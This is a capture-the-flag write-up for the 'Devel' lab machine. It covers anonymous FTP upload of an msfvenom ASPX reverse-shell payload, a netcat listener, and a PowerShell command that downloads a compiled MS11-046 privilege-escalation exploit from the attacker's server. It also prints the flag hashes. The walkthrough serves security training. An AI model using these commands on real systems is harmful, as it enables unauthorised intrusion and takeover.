---
layout: default
---

# Devel

`nmap` | `privesc` | `ftp` | `reverse shell to aspx webserver` | `file transfer`

## Enumeration

1. Scan with nmap

   ```
   ┌──(schoon3r㉿nexer)-[~/Engagements/THM]
   └─$ nmap 10.10.10.5 -A -T4 -Pn
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-24 20:03 EST
   Nmap scan report for 10.10.10.5
   Host is up (0.034s latency).
   Not shown: 998 filtered tcp ports (no-response)
   PORT   STATE SERVICE VERSION
   21/tcp open  ftp     Microsoft ftpd
   | ftp-anon: Anonymous FTP login allowed (FTP code 230)
   | 03-18-17  01:06AM       <DIR>          aspnet_client
   | 03-17-17  04:37PM                  689 iisstart.htm
   |_03-17-17  04:37PM               184946 welcome.png
   | ftp-syst:
   |_  SYST: Windows_NT
   80/tcp open  http    Microsoft IIS httpd 7.5
   |_http-server-header: Microsoft-IIS/7.5
   |_http-title: IIS7
   | http-methods:
   |_  Potentially risky methods: TRACE
   Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
   ```

2. FTP - looks like we can login with user anonymous
   ```
   ftp 10.10.10.5
   ```
3. Let's try to upload a file

   ```
   (in Kali)
   ┌──(schoon3r㉿nexer)-[~/Engagements/HTB]
   └─$ echo "Hello World" > text.txt

   (in FTP)
   tp> ls
   200 PORT command successful.
   125 Data connection already open; Transfer starting.
   03-18-17  01:06AM       <DIR>          aspnet_client
   03-17-17  04:37PM                  689 iisstart.htm
   11-25-21  03:25AM                   12 text.txt
   03-17-17  04:37PM               184946 welcome.png
   226 Transfer complete.
   ```

4. Cool. Let's look at the other service that is open.
5. Port 80. Let's try it on the browser. >>> Looks like an IIS default page.
6. Let's try and go to the pages that was inside the ftp directory
   - http://10.10.10.5/iisstart.htm
   - http://10.10.10.5/text.txt

## Starting a FootHold

7. So from here... we want to get a foothold on the server. We know we can upload a file and we know we can view the file from the browser. Let's turn to MSFVENOM
   ```
   msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.6 LPORT=4444 -o reverse-shell.aspx
   ```
   - -p is the location of our payload
   - -f is the format of the payload. Its ASPX because of the webserver
8. That will save a file reverse-shell.aspx to your directory. What will this payload do??? It creates a reverse shell to our netcat listener.
9. Let's now upload this file using our FTP anonymous login
10. Now let's start a netcat listener
    ```
    nc -nvlp 4444
    ```
11. Let us now go back to the browser to start the reverse shell
    ```
    http://10.10.10.5/reverse-shell.aspx
    ```
12. You will see that you now got a reverse shell in your netcat listener window
13. Lets traverse the directory.
14. You will find out that you do not have permission to view Babis and Administrator directories. This means that we need privesc.

## Enumerating for PrivEsc

15. let's type in:

    ```
    c:\Users>cd Classic .NET AppPool
    cd Classic .NET AppPool
    Access is denied.

    c:\Users>systeminfo
    systeminfo

    Host Name:                 DEVEL
    OS Name:                   Microsoft Windows 7 Enterprise
    OS Version:                6.1.7600 N/A Build 7600
    OS Manufacturer:           Microsoft Corporation
    OS Configuration:          Standalone Workstation
    OS Build Type:             Multiprocessor Free
    Registered Owner:          babis
    Registered Organization:
    Product ID:                55041-051-0948536-86302
    Original Install Date:     17/3/2017, 4:17:31 ��
    System Boot Time:          25/11/2021, 3:04:29 ��
    System Manufacturer:       VMware, Inc.
    System Model:              VMware Virtual Platform
    System Type:               X86-based PC
    Processor(s):              1 Processor(s) Installed.
                            [01]: x64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
    BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
    Windows Directory:         C:\Windows
    System Directory:          C:\Windows\system32
    Boot Device:               \Device\HarddiskVolume1
    System Locale:             el;Greek
    Input Locale:              en-us;English (United States)
    Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
    Total Physical Memory:     3.071 MB
    Available Physical Memory: 2.430 MB
    Virtual Memory: Max Size:  6.141 MB
    Virtual Memory: Available: 5.514 MB
    Virtual Memory: In Use:    627 MB
    Page File Location(s):     C:\pagefile.sys
    Domain:                    HTB
    Logon Server:              N/A
    Hotfix(s):                 N/A
    Network Card(s):           1 NIC(s) Installed.
                            [01]: vmxnet3 Ethernet Adapter
                                    Connection Name: Local Area Connection 3
                                    DHCP Enabled:    No
                                    IP address(es)
                                    [01]: 10.10.10.5
                                    [02]: fe80::58c0:f1cf:abc6:bb9e
                                    [03]: dead:beef::23c
    ```

16. A few interesting thing here is that

    - Its a Windows 7 Build 7600
    - Hotfix: N/A
    - It is based on the X86 architecture

17. While this is a very old pc, seems funny that there are no patches on the machine. Let's google
    ```
    Windows 7 build 7600 priv esc exploit
    ```
18. The first 2 results are from Exploit-DB. Let's check out the Build 7601(x86) - Local Priv Esc... which is exactly what we want.

## PrivEsc

19. Download the exploit and read the instructions on how to compile the exploit in C
20. Install mingw-w64
    ```
    sudo apt-get install mingw-w64
    ```
21. Compile the C program you've downloaded
    ```
    i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
    ```
22. Now we need to copy this file... into the C:\ drive of the target machine. Let's turn on a simple http server and copy the file
    ```
    python3 -m http.server 7331
    ```
23. Now from the netcat listener window... lets copy the file
    ```
    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:7331/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
    ```
24. Let's verify if the file is copied? Great! Let's run it ~
    ```
    c:\Users\Public\Downloads>40564
    40564
    ```
25. Looks good! Let's try a few command to be certain we have root priv
    ```
    c:\Windows\System32>whoami
    whoami
    nt authority\system
    ```
26. Now we can get both user and root flags

    ```
    c:\Users\babis\Desktop>type user.txt.txt
    type user.txt.txt
    9ecdd6a3aedf24b41562fea70f4cb3e8

    c:\Users\Administrator\Desktop>type root.txt
    type root.txt
    e621a0b5041708797c4fc4728bc72b4b
    ```

# Reference

1. https://www.exploit-db.com/exploits/40564
2. https://www.offensive-security.com/metasploit-unleashed/msfvenom/

# Summary

1. We enumerated the machine using nmap and found ports 21 and 80 open
2. We found that we can upload file using the anonymous login and we can execute those file within the webserver on port 80
3. We tried to get a foothold of the machine using an MSFVENOM payload with an aspx format.
4. Once we got the reverse shell, we immediately found that we dont have a privileged user.
5. To privesc... we enumerated the machine again and found that it is an unpatched Windows 7 machine with build 7600 (x86)
6. Googling for exploit we found a link to an exploit in exploit-db
7. Installed mingw to compile the C code into an executable program and thankfully the command to complile is already provided in the link.
8. We then started a simple http server so can transfer the file into the machine and downloaded the file using a powershell script.
9. After this, we found that we now have root priv.
